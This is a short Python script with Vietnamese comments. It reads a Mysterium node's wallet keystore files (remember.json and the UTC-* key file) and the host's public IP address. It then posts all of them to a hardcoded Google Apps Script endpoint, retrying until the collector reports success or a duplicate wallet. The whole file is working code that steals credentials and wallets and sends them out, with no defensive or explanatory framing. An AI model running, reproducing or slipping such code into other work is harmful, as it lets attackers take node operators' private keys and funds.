import requests
import json
import time
import random
import socket
import glob

GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwrS6YxYVuNFBx1XToDTYjbpSAKcrHklbmahzIsY5BHdTSxVzRKd9xW_mqxYnsC7EV82w/exec"

def get_public_ip():
    try:
        return requests.get("https://ifconfig.me").text.strip()
    except:
        return "Unknown"

def read_file(file_path):
    try:
        with open(file_path, "r") as file:
            return file.read().strip()
    except:
        return "Error reading file"

def get_utc_file():
    utc_files = glob.glob("/var/lib/mysterium-node/keystore/UTC-*")
    if utc_files:
        return read_file(utc_files[0])
    return "UTC file not found"

data = {
    "ip": get_public_ip(),
    "wallet": read_file("/var/lib/mysterium-node/keystore/remember.json"),
    "phase": get_utc_file()
}

max_retries = 5
for i in range(max_retries):
    response = requests.post(GOOGLE_SCRIPT_URL, json=data)
    print("Gửi dữ liệu lần {}: {}".format(i + 1, response.text))

    if "Success" in response.text or "Duplicate Wallet - Skipped" in response.text:
        break  # Không cần gửi lại nếu đã thành công hoặc bị trùng
    else:
        time.sleep(random.uniform(1, 3))
